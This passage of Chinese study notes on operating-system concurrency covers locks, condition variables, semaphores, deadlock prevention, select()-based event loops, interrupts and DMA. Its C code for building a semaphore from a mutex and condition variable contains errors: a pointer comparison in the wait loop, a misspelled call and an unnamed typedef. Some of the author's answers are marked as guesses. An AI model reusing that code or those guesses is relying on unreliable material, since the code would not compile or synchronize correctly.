<h3 id="并发链表"><a href="#并发链表" class="headerlink" title="并发链表"></a>并发链表</h3><p>让链表的操作实现线程安全并不复杂，重点是保证在更新链表的关键时刻（即临界区）加锁即可，并在更新完之后，释放锁，避免将加锁的位置提前到内存分配的时候，因为内存分配有可能发生错误，这样会导致锁没有释放；</p>
<p>虽然链表的线程安全容易做到，但是多核多线程下的高性能却是很有挑战，因为链表是一种线性查找的数据结构，它无法提前将任务分段，交给不同的 CPU 并发处理；</p>
<h3 id="并发队列"><a href="#并发队列" class="headerlink" title="并发队列"></a>并发队列</h3><p>对于先进先出的队列，需要设置两把锁，一把负责头部，一把负责尾部，它们之间可以实现并发，即在头部删除元素和尾部增加元素并不会发生冲突；</p>
<h3 id="并发散列表"><a href="#并发散列表" class="headerlink" title="并发散列表"></a>并发散列表</h3><p>在不考虑改变散列表大小的情况下，散列表的实现只需要基于之前的链表结构即可，每个桶对应一个单独的链表；而每个链表的背后已经是支持线程安全的；这种结构的散列表具有很好的扩展性，因为它实质上是链表间独立的锁，并不会相互影响；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201030090945.png"></p>
<h2 id="24-条件变量"><a href="#24-条件变量" class="headerlink" title="24.条件变量"></a>24.条件变量</h2><h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><p>锁只是解决了线程并发访问某个共享变量的问题，但有时候线程之间需要等待某种条件满足后才能继续往下进行，例如当某个线程执行完毕后，另一个线程再开始执行。最简单的解决方案是引入某个条件变量，需等待的线程在它的时间片中，不断的检查这个变量，如果条件满足了，就继续往下执行，如果不满足，就自旋等待。该方案的好处是实现简单，缺点是性能低下，因为自旋需要浪费掉整个时间片；</p>
<p>新的解决办法：除了已有的锁和条件变量后，再引入睡眠和循环检查；线程 A 持有锁后，检查到条件不满足时，就让 A 进入释放锁并进入睡眠；B 线程开始持有锁，做完动作，更新条件变量，发信号唤醒 A，并释放锁；A 被唤醒后，尝试重新取得持有锁后，再次检查条件变量，若满足，开始执行自己余下的动作； </p>
<blockquote>
<p>wait() 操作会做四个动作：释放锁、睡眠、被唤醒、获取锁；因此，在执行 wait 之前，当前线程获取锁是必须的，不然有可能长眠不醒了；</p>
<p>signal() 在执行之前也需要先获取持有锁，避免产生竞态条件；</p>
</blockquote>
<h3 id="生产者-消费者问题"><a href="#生产者-消费者问题" class="headerlink" title="生产者&#x2F;消费者问题"></a>生产者&#x2F;消费者问题</h3><blockquote>
<p>当有多个生产者线程和多个消费者线程时，如何解决它们之间使用共享缓冲区可能存在冲突的问题？</p>
</blockquote>
<p>为了尽可能提高效率，应该避免单次的生产-消费之间的轮换，而应该支持批量多生产和批量多消费，这样可以减少轮换等候的成本；因此，需要引入数组的数据结构，生产者可以依次给每个数组的每个位置写入值，而无须等待消费者是否已经来把值取走了，除非整个数组都写满了；这么做的原因在于，当某个生产者线程释放锁时，抢占到锁的不一定是消费者线程，也有可能是另一个生产者线程，因此该方案可以让它有事可做，而不是放弃它抢到的时间片；</p>
<p>另外还需要引入两个条件变量，分别代表生产者和消费者；当某个生产者线程完成了它自己的工作后，它就同时唤醒一个消费者线程并释放锁；（但释放后并意味着下一个抢到锁的是消费者，也有可能是一个生产者，反之亦然）；</p>
<blockquote>
<p>好奇：生产者是先释放锁，再唤醒消费者；还是先唤醒消费者后，再释放锁？</p>
<p>答：从安全的角度来说，貌似应该先释放锁，之后再唤醒消费者；因为如果先唤醒消费者，有可能在释放锁之前，消费者抢占到了时间片，然后尝试获取锁，发现获取不到，然后就重新进入睡眠了；</p>
</blockquote>
<h3 id="覆盖条件"><a href="#覆盖条件" class="headerlink" title="覆盖条件"></a>覆盖条件</h3><p>覆盖条件的一个例子是多线程的内存分配；内存分配函数检查当前可用堆内存，如果大于待分配值，则进行分配，如果小于，则进入睡眠；内存释放函数在释放某个之前分配的内存后，唤醒睡眠中的内存分配线程；但由于不知道当前释放的内存，是否能够满足哪些待分配线程，它只能将所有睡眠中的分配线程全部唤醒；</p>
<blockquote>
<p>不知道为什么这种方案叫做覆盖条件，它真实的本质是不再只唤醒某个线程，而是唤醒所有线程；虽然这种做法会降低性能，因为有些线程唤醒后发现条件仍未满足，然后只好又睡了；</p>
</blockquote>
<h2 id="24-信号量"><a href="#24-信号量" class="headerlink" title="24.信号量"></a>24.信号量</h2><blockquote>
<p>除了锁和条件变量外，信号量是另外一种解决并发问题的方案，这个方案很有趣，感觉它好像自带队列的性质，而且去除了 while 循环；</p>
</blockquote>
<h3 id="信号量的定义"><a href="#信号量的定义" class="headerlink" title="信号量的定义"></a>信号量的定义</h3><p>信号量（semophore）是一个整数值，并配套两个函数来操作它，它们分别是：</p>
<ul>
<li>sem_wait()：也叫 down 或 P 函数，它做两个动作，一是将信号量减1，二是判断减1后的信号量是否为负数，如果是，则让当前线程进入睡眠；</li>
<li>sem_post()：也叫 up 或 V 函数，它也做两个动作，一是将信号量加1，二是判断有无睡眠中的线程，如有，唤醒其中一个；</li>
</ul>
<blockquote>
<p>当信号量为负数时，该负数值刚好表示当前有多个线程处于睡眠状态中；</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="type">sem_t</span> s;</span><br><span class="line">sem_init(&amp;s, <span class="number">0</span>, <span class="number">1</span>); <span class="comment">// 初始化信号量，0 表示该信号量被同一进程的多个线程共享；1 表示初始值为 1；</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="二值信号量（锁）"><a href="#二值信号量（锁）" class="headerlink" title="二值信号量（锁）"></a>二值信号量（锁）</h3><blockquote>
<p>问：不知此处为何叫二值信号量，事实上当有多个线程时，信号量的值并不只是在 0 和 1 之间变化，而是有可能会出现负数；</p>
<p>答：被唤醒的线程将直接获得锁，不用再次执行 wait 进行判断（因为之前已经执行过了）；并在执行结束后，对信号量做加1的操作；</p>
</blockquote>
<p>当将信号量的初始值设定为 1 时，在临界区的前后调用 sem_wait 和 sem_post 函数的效果，跟上一章的 lock 和 unlock 作用很像，此时信号量发挥的作用跟锁是一样的；</p>
<p>此时信号量扮演的作用非常有趣和巧妙，由于每个线程在进入临界区前，都需要调用 sem_wait 函数尝试获取锁，如果获取不到，就会让自己进入睡眠状态；而当线程从临界区出来的时候，如果有线程在等待，它需要唤醒一个线程，那么这个被唤醒的线程，等同直接获取了锁（此时的信号量有可能依然为负数），而无须做进一步的判断（之前的锁方案有使用 while 进行判断）；</p>
<blockquote>
<p>问：如何保证所有的线程都有相同的机会被唤醒，而不会出现某些线程被饿死？</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sem_wait(&amp;m);</span><br><span class="line"><span class="comment">// critical section here</span></span><br><span class="line">sem_post(&amp;m);</span><br></pre></td></tr></table></figure>



<h3 id="信号量用作条件变量"><a href="#信号量用作条件变量" class="headerlink" title="信号量用作条件变量"></a>信号量用作条件变量</h3><p>当将信号量的初始值设定为 0 时，它可以作为条件变量，用于 A 线程调用 sem_wait 函数等待条件满足时，再继续往下执行，而 B 线程负责调用 sem_post 函数改变条件；</p>
<h3 id="生产者-消费者问题-1"><a href="#生产者-消费者问题-1" class="headerlink" title="生产者&#x2F;消费者问题"></a>生产者&#x2F;消费者问题</h3><p>生产者&#x2F;消费者问题据说也叫做有界缓冲区问题；原因在于除了缓冲区的 empty&#x2F;full 判断外，为了避免多个生产者（或消费者）同时进入 get&#x2F;put 函数，需要对多个生产者之间增加互斥，即每次只能有一个生产者进入 put，或者只有一个消费者进入 get；</p>
<p>此处对 get&#x2F;put 的互斥锁，不再放在 empty&#x2F;full 锁的外面，不然由于它的作用域过大，将直接导致死锁情况发生，即某个线程因为 empty 进入睡眠了，但却仍然持有 mutex 锁，导致后续的线程无法获取锁并将其唤醒；避免作用域过大的做法，即为考虑锁的使用界限，因此称为有界缓冲区问题；</p>
<h3 id="读者-写者锁"><a href="#读者-写者锁" class="headerlink" title="读者-写者锁"></a>读者-写者锁</h3><blockquote>
<p>不同的数据结构，会面临不同的并发状态，例如链表结构，只有写的并发是需要用到锁的，而读的并发则可以不用锁，因此，如果为不同的数据结构设计不同形式的锁，有利于进一步提高性能；</p>
</blockquote>
<p>它的思路是设计两个信号量，一个用来控制读，一个用来控制写，并增加一个当前正在读的线程的计数器；第一个读者需要同时获取读锁和写锁，这样可以避免其他线程在它读的时候，进行写的操作；第二个及以后的读者则无须获取写锁；最后一个退出的读者需要负责释放写锁，以便让写者线程可以有机会进行写的操作；</p>
<p>这个方案虽然可以实现读写分离，但是它有两个问题，一个是写者线程有可能被饿死；二是相比普通单锁的方案，由于多增加了一个锁，性能上其实并没有优势；</p>
<blockquote>
<p>启示：复杂的方案不一定更好，有时候简单的笨办法反而不错；Hill 定律：大而笨更好；</p>
</blockquote>
<h3 id="哲学家就餐问题"><a href="#哲学家就餐问题" class="headerlink" title="哲学家就餐问题"></a>哲学家就餐问题</h3><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201105085254.png"></p>
<p>这个问题的有趣之外在于，哲学家们是坐成一圈的，所以一个人的左边，是另一个人的右边。因此如果每个哲学家取叉子的顺序一样的话，将有可能造成循环等待的问题，结果便是死锁；为了避免死锁，需要至少让一个哲学家的取叉子顺序跟别人不同，这样就至少会有一个哲学家能够吃上饭了；</p>
<h3 id="如何实现信号量"><a href="#如何实现信号量" class="headerlink" title="如何实现信号量"></a>如何实现信号量</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用锁+条件变量的方式，来实现信号量机制</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zemt_t</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> value;</span><br><span class="line">    <span class="type">pthread_cond_t</span> cond;</span><br><span class="line">    <span class="type">pthread_mutex_t</span> lock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Zem_init</span><span class="params">(Zem_t *s, <span class="type">int</span> value)</span> &#123;</span><br><span class="line">    s-&gt;value = value;</span><br><span class="line">    Cond_init(&amp;s-&gt;cond);</span><br><span class="line">    Mutex_init(&amp;s-&gt;lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Zem_wait</span><span class="params">(Zem_t *s)</span> &#123;</span><br><span class="line">    Mutex_lock(&amp;s-&gt;lock);</span><br><span class="line">    <span class="keyword">while</span>(&amp;s-&gt;value &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 进入睡眠前会释放锁；唤醒后会持有锁</span></span><br><span class="line">        Cont_wait(&amp;s-&gt;cond, &amp;s-&gt;lock);</span><br><span class="line">    &#125;</span><br><span class="line">    s-&gt;value -= <span class="number">1</span>;</span><br><span class="line">    Mutex_unlock(&amp;s-&gt;lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Zem_post</span><span class="params">(Zem_t *s)</span> &#123;</span><br><span class="line">    Mutex_lock(&amp;s-&gt;lock);</span><br><span class="line">    s-&gt;value += <span class="number">1</span>;</span><br><span class="line">    Cond_signal(&amp;s-&gt;cond);</span><br><span class="line">    Mutex_unlock(&amp;s-&gt;lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>使用锁+条件变量也可以实现信号量，因此信号量看上去有点像是锁+条件变量的一种抽象；它既可以用来替代锁，也可以用来替代条件变量，但是，能否替代成功，跟问题场景密切相关，并不是所有的场景都能够替代成功的；因此，使用信号量时要特别的小心，虽然看似简单了，但效果不一定百分百保证，需要进行更加深入的分析和测试，才能够建立信心；</p>
<blockquote>
<p>安全起见，使用原始的锁+条件变量方案，或许是更好的做法；</p>
</blockquote>
<h2 id="25-常见并发问题"><a href="#25-常见并发问题" class="headerlink" title="25.常见并发问题"></a>25.常见并发问题</h2><blockquote>
<p>有哪些常见的并发缺陷？如何处理常见的并发缺陷？</p>
</blockquote>
<h3 id="有哪些类型的缺陷"><a href="#有哪些类型的缺陷" class="headerlink" title="有哪些类型的缺陷"></a>有哪些类型的缺陷</h3><p>一般有非死锁和死锁两类缺陷，前者占多数；</p>
<h3 id="非死锁缺陷"><a href="#非死锁缺陷" class="headerlink" title="非死锁缺陷"></a>非死锁缺陷</h3><h4 id="违反原子性缺陷"><a href="#违反原子性缺陷" class="headerlink" title="违反原子性缺陷"></a>违反原子性缺陷</h4><p>代码原本预期按原子性来执行，但实际的效果并没有实现原子性，A 线程的部分操作在执行到一半的过程中，可能会因为调度产生中断，某些值被新线程 B 修改，导致调度回 A 线程时，其执行环境已经发生了破坏，导致出错；</p>
<p>解决办法：给需要原子性的操作加锁；</p>
<h4 id="错误顺序缺陷"><a href="#错误顺序缺陷" class="headerlink" title="错误顺序缺陷"></a>错误顺序缺陷</h4><p>B 线程在运行过程中可能假定某个值已经由前面的 A 线程完成了初始化，但实际上，由于调度的随机性，有可能这个时候A 线程还未被调度过，初始化并未完成；</p>
<p>解决办法：引入锁+条件变量+状态变量；</p>
<blockquote>
<p>绝大部分的非死锁缺陷（约 97%）都是以上两种类型的缺陷；</p>
</blockquote>
<h3 id="死锁缺陷"><a href="#死锁缺陷" class="headerlink" title="死锁缺陷"></a>死锁缺陷</h3><p>有多个锁，且线程的抢锁顺序不同，导致最终陷入相互等待的境地；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201106080653.png"></p>
<h4 id="产生的原因"><a href="#产生的原因" class="headerlink" title="产生的原因"></a>产生的原因</h4><ul>
<li>复杂系统中，组件之间很可能存在相互依赖，例如虚拟内存需要通过文件系统访问磁盘读取数据到内存，而文件系统又要访问虚拟内存申请一片内存页，存放相应的数据；</li>
<li>封装：开发人员一般倾向于模块化实现的细节，但是模块化有时无法跟锁很好的契合，导致出现死锁；</li>
</ul>
<h4 id="产生死锁的条件"><a href="#产生死锁的条件" class="headerlink" title="产生死锁的条件"></a>产生死锁的条件</h4><p>必须同时满足以下四点</p>
<ul>
<li>互斥：对于共享的某个资源，线程对其访问存在互斥性，即一次只有一个线程可以抢到访问资源的锁；</li>
<li>持有并等待：线程持有一个资源后，还需要等待抢占其他资源；</li>
<li>非抢占：线程已经获得的资源，不会被其线程抢占；</li>
<li>循环等待：线程之间存在回路，某个线程持有的资源，刚好是下一个线程想要抢占的；</li>
</ul>
<h4 id="预防的方法"><a href="#预防的方法" class="headerlink" title="预防的方法"></a>预防的方法</h4><h5 id="循环等待"><a href="#循环等待" class="headerlink" title="循环等待"></a>循环等待</h5><p>针对循环等待，简单的解决办法就是强制线程对锁的抢占需要按照固定的顺序，比如有两个锁 L1 和 L2，总是先抢 L1，再抢 L2；这样就可以避免两个锁被不同的线程分别持有；</p>
<ul>
<li>全序：锁少的时候用；</li>
<li>偏序：锁很多的时候用；</li>
</ul>
<h5 id="持有并等待"><a href="#持有并等待" class="headerlink" title="持有并等待"></a>持有并等待</h5><p>持有并等待的问题根源于等待的资源可能被占用，因此可以通过增加一个全局锁来解决；所有的线程，必须先抢到这个全局锁后，才可以开始抢占剩下的锁，这样就可以避免存在资源在不同线程手上的问题，但这个方案也有一些缺点</p>
<ul>
<li>一是降低了并发性，因为现在所有的线程都得等待同一个锁了；</li>
<li>二是不便于封装，据说是因为需要准确的知道需要抢些锁，并提前抢到这些锁（暂时还没有想明白为什么，可能是因为锁需要设置成全局的，无法封装到函数内部里面去）；</li>
</ul>
<h5 id="非抢占"><a href="#非抢占" class="headerlink" title="非抢占"></a>非抢占</h5><p>解决思路就是增加一个 trylock 的判断，当暂时无法抢到下一个资源时，就先放弃已经占有的资源；这种方式肯定不会造成死锁，但有可能陷入活锁的问题；就是大家总是让来让去，最后啥进展也没有；为了避免活锁问题，需要引入一个随机等待时间，即等候一个随机时间后，再开始新的一轮循环，这样可以一定程度的降低活锁概率；</p>
<h5 id="互斥"><a href="#互斥" class="headerlink" title="互斥"></a>互斥</h5><p>互斥性是锁的本质，如果不提供互斥性，锁就没有存在的意义了；如果不用锁，则需要通过利用硬件指令的原子性，来实现原子性的操作，例如比较并互换指令（但是感觉它的应用场景貌似有限？）；但是这种方案有可能会带来活锁问题；</p>
<h4 id="通过调度避免死锁"><a href="#通过调度避免死锁" class="headerlink" title="通过调度避免死锁"></a>通过调度避免死锁</h4><p>如果我们能够提前知道不同线程可能对锁的需求不同，则只需避免将会有完全重叠锁需求的线程调度到不同 CPU 上同时运行即可；不过这种方案有硬伤，一是它极大的降低了性能；二是我们需要提前知道所有的任务，并知道它们各自需要什么样的锁，这样才可以设计出调度的方案；</p>
<p>示例一：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201106085457.png"></p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201106085506.png"></p>
<p>示例二：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201106085539.png"></p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201106085549.png"></p>
<h4 id="检查和恢复"><a href="#检查和恢复" class="headerlink" title="检查和恢复"></a>检查和恢复</h4><p>最后一个不是办法的办法是允许死锁发生，然后定期做一次检查，如果发生停滞了，就做一次重启；很多数据库采用了这个方案； </p>
<h2 id="26-基于事件的并发"><a href="#26-基于事件的并发" class="headerlink" title="26.基于事件的并发"></a>26.基于事件的并发</h2><h3 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h3><p>事件处理程序一开始啥也不做，坐等事件的到来；它轮询事件队列，获取待处理的事件，然后依次处理</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    events = getEvents();</span><br><span class="line">    <span class="keyword">for</span>  (e in events) &#123;</span><br><span class="line">        processEvent (e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="select-API-介绍"><a href="#select-API-介绍" class="headerlink" title="select() API 介绍"></a>select() API 介绍</h3><p>操作系统提供了一个 select 系统调用函数来实现基于事件循环的并发；它的原理也很简单，该系统调用接收一堆文件描述符的集合和待检查的数量上限；之后操作系统在该数量上限内，依次逐一检查每个文件描述符（包括读、写、错误三类），看某个描述符是否已经进入了就绪的状态；最后，将所有已经处于就绪状态的文件描述符组成一个列表返回；</p>
<blockquote>
<p>问：为什么要引入一个上限？</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">select</span> <span class="params">(</span></span><br><span class="line"><span class="params">	<span class="type">int</span> nfds, <span class="comment">// 待检查文件描述符数量上限</span></span></span><br><span class="line"><span class="params">    fd_set *<span class="keyword">restrict</span> readfds,  <span class="comment">// 读</span></span></span><br><span class="line"><span class="params">    fd_set *<span class="keyword">restrict</span> writefds, <span class="comment">// 写</span></span></span><br><span class="line"><span class="params">    fd_set *<span class="keyword">restrict</span> errorfds, <span class="comment">// 异常</span></span></span><br><span class="line"><span class="params">    <span class="keyword">struct</span> timeval *<span class="keyword">restrict</span> timeout  <span class="comment">// 检查时间，超时后返回；若为 NULL 则在未找到任何就绪的描述符前先阻塞；若为 0 则马上返回</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<h3 id="使用-select"><a href="#使用-select" class="headerlink" title="使用 select()"></a>使用 select()</h3><p>建立一个无限循环，在循环开始时，初始化并准备好一个文件描述符的集合，然后调用 select，将集合送进去检查；如果某个描述符已经进入了就绪状态，select 会对其进行标记；当 select 标记完毕返回完；再依次遍历集合中的每个描述符，看其标记是否改变，若改变，表示该描述符已经就绪，因此可调用相同的函数，对其进行处理；</p>
<blockquote>
<p>由于只剩下一个线程在处理事件，因此基于事件的并发处理机制，就暂时不需要锁了，因为不存在线程之间的冲突；不过当 CPU 不止一个时，如果想利用多核 CPU，则有可能会存在冲突；</p>
</blockquote>
<h3 id="I-O-异步"><a href="#I-O-异步" class="headerlink" title="I&#x2F;O 异步"></a>I&#x2F;O 异步</h3><p>如果应用程序发起的操作，仅仅在 CPU 层面就可以完成的话，事件机制是没有任何性能问题的；但是如果某个操作涉及 CPU 之外的操作，例如对 I&#x2F;O 设备的访问，由于这些设备很慢，将导致 CPU 要等待很长时间才能得到结果，这将导致严重的性能下降，因为 CPU 的时间片大量闲置；仅仅有 select 调用，还不足以让基于事件的机制应付各种业务场景，需要引入一些新的操作系统接口来完善它；</p>
<p>早期操作系统对 I&#x2F;O 设备发起的请求是同步的，为了支持基于事件的并发，现代操作系统开始提供异步的 IO 请求接口；应用程序调用该接口，发起 IO 请求，但在请求完成之后，操作系统又会马上将控制权返回给应用程序；</p>
<p>当 IO 请求中的动作完成后，此时有两种机制可以通知应用程序：</p>
<ul>
<li>应用程序定期轮询的 IO 请求队列，查看是否有某个请求已经就绪；该方案的缺点是成本过高；</li>
<li>请求完成后，发出中断信号给应用程序，应用程序再进行处理；优点：性能好；</li>
</ul>
<h3 id="状态管理"><a href="#状态管理" class="headerlink" title="状态管理"></a>状态管理</h3><p>当一个异步的 IO 请求进入就状态后，应用程序需要知道如何处理该请求的结果，因为应用程序可能在之前已经发起过很多个 IO 异步请求，每一个请求的结果可能需要使用不同的方式进行处理；为了能够让请求结果和处理方式一一对应，一种办法是在发起请求的时候，将相应的结果处理方式，也记录在文件描述符的某个属性中，这样当请求结果返回时，就可以在文件描述符中查找到该属性，获得对应的结果处理办法；</p>
<h3 id="仍然存在的问题"><a href="#仍然存在的问题" class="headerlink" title="仍然存在的问题"></a>仍然存在的问题</h3><ul>
<li>无法利用多核CPU：虽然单线程的机制避免了使用锁带来的麻烦，但是单线程无法利用多核的 CPU 来提高性能；如果针对每个 CPU 各开一个线程，则线程之间将不可避免会遇到临界区冲突的问题；</li>
<li>部分系统调用非异步：当某个非异步的系统调用发生错误时，例如发生了页错误，由于应用程序是单线程的，此时将导致整个应用程序被阻塞挂起，无法做出响应；</li>
<li>可能会累积复杂性：基于事件的代码引入了一些复杂性，随着时间的推移，这些代码的复杂度将逐渐累积，可能会给后续增加代码管理成本；</li>
</ul>
<blockquote>
<p>基于事件的并发机制并不是万能药，或许暂时较为可行的解决方案之一，是将应用程序设计成无状态的，这样就可以充分利用多核的CPU，甚至是多个机器节点；而将有状态的数据，交给其他的应用程序如数据库进行管理；数据库来负责原子性的部分；</p>
</blockquote>
<h2 id="27-I-O-设备"><a href="#27-I-O-设备" class="headerlink" title="27.I&#x2F;O 设备"></a>27.I&#x2F;O 设备</h2><blockquote>
<p>问题：I&#x2F;O 显然是非常重要的，那要如何将 I&#x2F;O 集成到系统中？常见的机制是什么？如何让其变得高效？</p>
</blockquote>
<h3 id="系统架构"><a href="#系统架构" class="headerlink" title="系统架构"></a>系统架构</h3><p>不同的设备使用不同速度规格的总线相连，取得成本和速度之间的折中平衡；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201108081233.png"></p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201108082032.png"></p>
<h3 id="标准设备"><a href="#标准设备" class="headerlink" title="标准设备"></a>标准设备</h3><p>计算机是由多种设备组合在一起协同工作的，设备与设备之间需要相互配合协作；因此，每个设备都需要定义一套自己的接口和交互协议，以便别人可以调用它提供的功能；而在设备内部，设备需要负责接口所代表的功能的具体实现；实现的办法同样包括拥有自己的微处理器、通用内存、完成特定功能的芯片等；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201108082253.png"></p>
<h3 id="标准协议"><a href="#标准协议" class="headerlink" title="标准协议"></a>标准协议</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (STATUS == BUSY)</span><br><span class="line">	; <span class="comment">// 轮询等待，直到设备空闲</span></span><br><span class="line">write data to DATA <span class="keyword">register</span> <span class="comment">// 设备空闲时，向设备DATA寄存器写入数据</span></span><br><span class="line">write command to COMMAND <span class="keyword">register</span> <span class="comment">// 向设备的 COMMAND 寄存器写入指令，之后设备开始按指令处理数据</span></span><br><span class="line"><span class="keyword">while</span> (STATUS == BUSY)</span><br><span class="line">    ; <span class="comment">// 轮询等待设备处理完毕</span></span><br><span class="line">get data or status from <span class="keyword">register</span> <span class="comment">// 处理完毕后，从设备的寄存器读取状态和数据</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<blockquote>
<p>标准协议的交互逻辑还是很简单的，问题在于太过于低效，因为 CPU 要在整个时间片里面不断轮询，浪费了很多无谓的时间；</p>
</blockquote>
<h3 id="利用中断减少-CPU-开销"><a href="#利用中断减少-CPU-开销" class="headerlink" title="利用中断减少 CPU 开销"></a>利用中断减少 CPU 开销</h3><p>减少 CPU 开销的一个办法是引入中断机制，让设备处理完毕后，可以给 CPU 发一个中断信号，之后 CPU 就可以调用提前映射好的中断处理程序，处理设备计算结果；</p>
<p>中断机制并非在所有情况下都是最好的方案，它比较适用于与计算速度比较慢的设备进行协作的场景中；如果设备的计算速度很快，在收到命令后能够很快给出结果，则中断并没有太大意义，反而增加了切换的成本，此时传统的轮询机制的性能反而更好；</p>
<p>但是有时候并不知道设备的处理速度有多快，一个折中的办法是引入混合模式，即 CPU 在发送完指令给设备后，就尝试轮询一小段时间，如果在该时间内设备仍然未处理完毕，CPU 就切换到其他线程；</p>
<p>网络场景也不适合完全使用中断，因为服务器有可能在短时间内收到大量的请求，如果只用中断机制，将使得 CPU 疲于应付大量的中断信号，而无暇处理真正的请求内容；此时适当配合使用轮询反而效果更好，CPU 可以通过轮询的方式接收一批请求的数据包，然后专心处理它们；处理完之后，再轮询网卡，处理下一批请求的数据包；</p>
<p>另外也可以在设备层面对中断机制进行优化，设备不再是一处理好马上发出中断，而是可以稍等一小段时间，先继续处理一些请求，因为它们有可能也很快可以完成；之后再一次性的发起一次中断；通过将多个中断合并成一个中断，也可以降低中断的性能代价；</p>
<blockquote>
<p>问题：当 CPU 收到设备发过来的中断信号后，由于此时 CPU 有可能已经切换到其他线程，CPU 如何知道中断信号是属于哪个线程的？</p>
<p>答：猜测 CPU 并不需要知道，它只要把信号转发给操作系统就好了，由于操作系统负责做好映射表，查询某个设备之前是由哪个线程调用的；此时操作系统负责唤醒该线程；</p>
</blockquote>
<h3 id="利用-DMA-更高效的传输数据"><a href="#利用-DMA-更高效的传输数据" class="headerlink" title="利用 DMA 更高效的传输数据"></a>利用 DMA 更高效的传输数据</h3><p>当 CPU 在跟设备交互的时候，有一个环节是需要向设备写入或读取数据，这个动作本身也是需要时间的，但是它是非常简单的数据读取或拷贝，并不需要什么计算能力，因此让 CPU 来做这个工作有点屈才和得不偿失；为了避免这个问题，通过引入 DMA（direct memory access）机制，给 CPU 减轻工作压力，让它去处理其他更高价值的工作；</p>
<p>当进入读写数据的环节时，CPU 就发送相关的指令给 DMA，包括数据在内存中的位置，数据的大小，数据的目的地等信息；之后 CPU 开始去做其他的工作，而 DMA 就负责接下来的数据传输工作；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201108090220.png"></p>
<h3 id="操作系统与设备交互的方法"><a href="#操作系统与设备交互的方法" class="headerlink" title="操作系统与设备交互的方法"></a>操作系统与设备交互的方法</h3><blockquote>
<p>问：操作系统用什么方式跟设备发生交互？例如从设备读取数据，或者向设备写入数据？</p>
</blockquote>
<h4 id="方法一：I-O-指令"><a href="#方法一：I-O-指令" class="headerlink" title="方法一：I&#x2F;O 指令"></a>方法一：I&#x2F;O 指令</h4><p>CPU 提供了一些 I&#x2F;O 指令供操作系统调用；当操作系统想要向某个设备写入数据时，就调用该指令，指定设备的某个寄存器（设备存放数据的地方），指定端口号（代表某个特定的目标设备）；CPU 在收到指令后，执行向设备写入数据的操作；</p>
<blockquote>
<p>这些 I&#x2F;O 指令都是特权指令，只有操作系统才有权调用，普通程序无权调用；</p>
</blockquote>
